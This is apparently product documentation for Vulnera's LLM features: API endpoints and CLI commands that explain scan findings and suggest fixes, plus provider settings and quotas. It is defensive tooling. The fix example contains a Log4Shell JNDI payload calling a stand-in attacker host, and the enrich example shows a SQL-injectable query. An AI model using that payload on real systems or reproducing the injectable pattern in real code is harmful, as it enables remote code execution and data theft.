# LLM Features (Explanations, Fixes, Queries)

Vulnera’s LLM features are **post-processing only**. Detection is performed by SAST, Secrets, API Security, and Dependency Analysis modules; LLMs are used to **explain** findings and **propose fixes** after the scan. LLM calls require network access and valid provider credentials.

---

## What’s Available

### 1) Explain a Vulnerability (API)

Endpoint:

- `POST /api/v1/llm/explain`

Request (example):

```/dev/null/request.json#L1-6
{
  "vulnerability_id": "CVE-2021-44228",
  "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints.",
  "affected_component": "org.apache.logging.log4j:log4j-core",
  "audience": "technical"
}
```

Response (example):

```/dev/null/response.json#L1-8
{
  "explanation": "This vulnerability allows remote code execution because ...",
  "key_points": ["Remote Code Execution", "JNDI Injection", "Critical Severity"],
  "mitigation_steps": ["Upgrade to version 2.15.0", "Disable JNDI lookup"]
}
```

---

### 2) Generate a Code Fix (API)

Endpoint:

- `POST /api/v1/llm/fix`

Request (example):

```/dev/null/request.json#L1-6
{
  "vulnerability_id": "CVE-2021-44228",
  "vulnerable_code": "logger.error(\"${jndi:ldap://attacker.com/a}\");",
  "language": "java",
  "context": "src/main/java/com/example/App.java"
}
```

Response (example):

```/dev/null/response.json#L1-6
{
  "fixed_code": "logger.error(\"User input: {}\", sanitizedInput);",
  "explanation": "Replaced direct string concatenation with parameterized logging.",
  "confidence": 0.95
}
```

---

### 3) Natural Language Query (API)

Endpoint:

- `POST /api/v1/llm/query`

Request (example):

```/dev/null/request.json#L1-4
{
  "query": "How do I fix the SQL injection in login.php?",
  "context": { "file": "login.php", "content": "..." }
}
```

Response (example):

```/dev/null/response.json#L1-4
{
  "answer": "Use prepared statements and parameterized queries...",
  "references": ["https://owasp.org/www-community/attacks/SQL_Injection"]
}
```

---

### 4) Enrich Job Findings (API)

Endpoint:

- `POST /api/v1/jobs/{job_id}/enrich`

Request (example):

```/dev/null/request.json#L1-6
{
  "finding_ids": ["finding_123", "finding_456"],
  "code_contexts": {
    "finding_123": "def login(user, password):\n    query = f\"SELECT * FROM users WHERE user='{user}'\""
  }
}
```

Response (example):

```/dev/null/response.json#L1-8
{
  "job_id": "550e8400-e29b-41d4-a716-446655440000",
  "enriched_count": 5,
  "failed_count": 1,
  "findings": [
    { "id": "finding_123", "severity": "Critical", "description": "SQL Injection...", "location": "src/auth.py:42:10", "explanation": "...", "remediation_suggestion": "Use parameterized queries..." }
  ]
}
```

---

## CLI Support

### Generate a Fix (CLI)

Command:

- `vulnera generate-fix`

Usage:

```/dev/null/commands.txt#L1-4
vulnera generate-fix \
  --vulnerability CVE-2021-44228 \
  --code src/main/java/com/example/App.java \
  --line 42
```

Notes:

- Requires online mode, authentication, and available quota.
- If offline, unauthenticated, or quota exceeded, the command exits with an error code.

### Bulk SAST Fix Suggestions (CLI)

Command:

- `vulnera sast --fix`

Usage:

```/dev/null/commands.txt#L1-2
vulnera sast . --fix
```

Notes:

- Runs SAST locally, then uses the server for LLM-powered fix suggestions.
- Requires online mode and authentication.

---

## Provider Configuration

LLM providers are configured via `vulnera_core::config::LlmConfig` and environment variables.

### Provider Selection

- `VULNERA__LLM__PROVIDER` = `google_ai` | `openai` | `azure`
- `VULNERA__LLM__DEFAULT_MODEL`
- `VULNERA__LLM__TEMPERATURE`
- `VULNERA__LLM__MAX_TOKENS`
- `VULNERA__LLM__TIMEOUT_SECONDS`
- `VULNERA__LLM__ENABLE_STREAMING`

### Google AI (Gemini)

- `GOOGLE_AI_KEY`
- `VULNERA__LLM__GOOGLE_AI__BASE_URL`

### OpenAI

- `OPENAI_API_KEY`
- `VULNERA__LLM__OPENAI__BASE_URL`
- `VULNERA__LLM__OPENAI__ORGANIZATION_ID`

### Azure OpenAI

- `AZURE_OPENAI_KEY`
- `VULNERA__LLM__AZURE__ENDPOINT`
- `VULNERA__LLM__AZURE__DEPLOYMENT`
- `VULNERA__LLM__AZURE__API_VERSION`

---

## Quota and Cost

LLM operations are higher-cost than standard analysis:

- **Analysis**: 3 tokens
- **LLM (explain/fix/query)**: 6 tokens

Use LLM sparingly for high-severity findings, and prefer batch enrichment for efficiency.

---

## Troubleshooting

**LLM requests fail in offline mode**
LLM requires network access. Remove `--offline` and ensure the server is reachable.

**Authentication required**
Run `vulnera auth login` or set `VULNERA_API_KEY`.

**Quota exceeded**
Check `vulnera quota` and reduce LLM usage or wait for reset.

---

## Next Steps

- [Quota & Pricing](quota-pricing.md)
- [Configuration Reference](../reference/configuration.md)
